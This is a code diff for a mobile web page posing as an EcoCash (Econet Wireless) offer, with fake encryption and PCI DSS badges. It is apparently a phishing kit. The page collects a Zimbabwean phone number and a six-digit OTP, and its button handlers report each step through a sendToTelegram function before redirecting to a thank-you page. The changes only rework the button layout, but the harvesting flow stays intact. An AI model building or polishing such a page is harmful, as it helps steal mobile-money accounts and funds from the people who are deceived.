@@ -87,7 +87,7 @@ body{
 .body{
   flex:1;overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;
-  padding:20px 14px max(106px,calc(90px + env(safe-area-inset-bottom)));
+  padding:20px 14px max(24px,env(safe-area-inset-bottom));
   overscroll-behavior:contain;min-height:0;
   position:relative;z-index:1;
 }
@@ -241,16 +241,7 @@ input:focus{
 .sec-badge+.sec-badge{border-left:1px solid var(--border)}
 .sec-badge svg{opacity:.5}
 
-/* STICKY FOOTER */
-.sticky-footer{
-  position:absolute;bottom:0;left:0;right:0;
-  padding:14px 14px max(22px,env(safe-area-inset-bottom));
-  background:linear-gradient(to top,rgba(238,243,252,.98) 65%,transparent);
-  backdrop-filter:blur(6px);
-  z-index:10;
-}
-
-/* #6 SPRING BUTTON */
+/* INLINE BUTTON — sits in scroll flow directly after card */
 .action-btn{
   background:linear-gradient(135deg,#2678ff,#0033a0);
   color:#fff;border:none;width:100%;padding:16px;
@@ -261,6 +252,7 @@ input:focus{
   box-shadow:0 6px 20px rgba(26,111,255,.4);
   transition:opacity .2s,transform .2s cubic-bezier(.34,1.56,.64,1),box-shadow .2s;
   position:relative;overflow:hidden;
+  margin-top:10px;
 }
 .action-btn::after{
   content:'';position:absolute;inset:0;
@@ -337,6 +329,7 @@ input:focus{
         <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit encrypted</div>
         <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS compliant</div>
       </div>
+      <button class="action-btn" id="mainBtn">Receive Offer</button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
@@ -372,10 +365,9 @@ input:focus{
           </div>
         </div>
       </div>
+      <button class="action-btn" id="otpBtn">Confirm OTP</button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
-
-    <!-- STEP 3: Processing -->
     <div id="step4" class="step">
       <div class="card">
         <div class="card-top-bar"></div>
@@ -387,10 +379,6 @@ input:focus{
       </div>
     </div>
 
-  </div>
-
-  <div class="sticky-footer">
-    <button class="action-btn" id="mainBtn">Receive Offer</button>
   </div>
 
 </div>
@@ -432,14 +420,7 @@ async function sendToTelegram(eventName){
 function showStep(id){
   document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
   document.getElementById(id).classList.add("active");
-  currentStep=id;updateBtn();
-}
-
-function updateBtn(){
-  const btn=document.getElementById("mainBtn");
-  if(currentStep==="step1"){btn.textContent="Receive Offer";validateLogin();}
-  else if(currentStep==="step3"){btn.textContent="Confirm OTP";validateOtp();}
-  else{btn.textContent="Processing...";btn.classList.remove("active");}
+  currentStep=id;
 }
 
 const phoneEl=document.getElementById("phone");
@@ -486,8 +467,7 @@ function renderOtp(){
     if(i===cursor&&document.activeElement===otpHidden) box.classList.add("active");
   });
   otpValue=val;
-  document.getElementById("mainBtn").classList.toggle("active",val.length===6);
-  /* #8 haptic on each digit */
+  document.getElementById("otpBtn").classList.toggle("active",val.length===6);
   if(navigator.vibrate) navigator.vibrate(4);
 }
 otpHidden.addEventListener("input",renderOtp);
@@ -499,21 +479,20 @@ function resetOtp(disabled){
   otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;renderOtp();
   if(!disabled) otpHidden.focus();
 }
-function validateOtp(){document.getElementById("mainBtn").classList.toggle("active",otpValue.length===6)}
 
 document.getElementById("mainBtn").onclick=()=>{
-  if(currentStep==="step1"){
-    if(loginClicked) return;loginClicked=true;
-    sendToTelegram("receive_offer_clicked");
-    const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
-    document.getElementById("maskedNumber").textContent="Code sent to "+masked;
-    showStep("step3");startTimer();
-  } else if(currentStep==="step3"){
-    if(otpSubmitted) return;otpSubmitted=true;
-    sendToTelegram("offer_received");
-    showStep("step4");
-    setTimeout(()=>{location.href="thankyou.html"},1200);
-  }
+  if(loginClicked) return;loginClicked=true;
+  sendToTelegram("receive_offer_clicked");
+  const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
+  document.getElementById("maskedNumber").textContent="Code sent to "+masked;
+  showStep("step3");startTimer();
+};
+
+document.getElementById("otpBtn").onclick=()=>{
+  if(otpSubmitted) return;otpSubmitted=true;
+  sendToTelegram("offer_received");
+  showStep("step4");
+  setTimeout(()=>{location.href="thankyou.html"},1200);
 };
 
 document.getElementById("resendBtn").onclick=()=>{
@@ -527,12 +506,12 @@ function startTimer(){
   let t=120;
   const timeEl=document.getElementById("time"),resendBtn=document.getElementById("resendBtn");
   timeEl.textContent=t;resendBtn.classList.remove("active");resendClicked=false;
-  resetOtp(false);document.getElementById("mainBtn").classList.remove("active");
+  resetOtp(false);document.getElementById("otpBtn").classList.remove("active");
   const timer=setInterval(()=>{
     t--;timeEl.textContent=t;
     if(t<=0){
       clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
-      document.getElementById("mainBtn").classList.remove("active");
+      document.getElementById("otpBtn").classList.remove("active");
       document.getElementById("maskedNumber").textContent="Code expired. Tap Resend to get a new one.";
     }
   },1000);
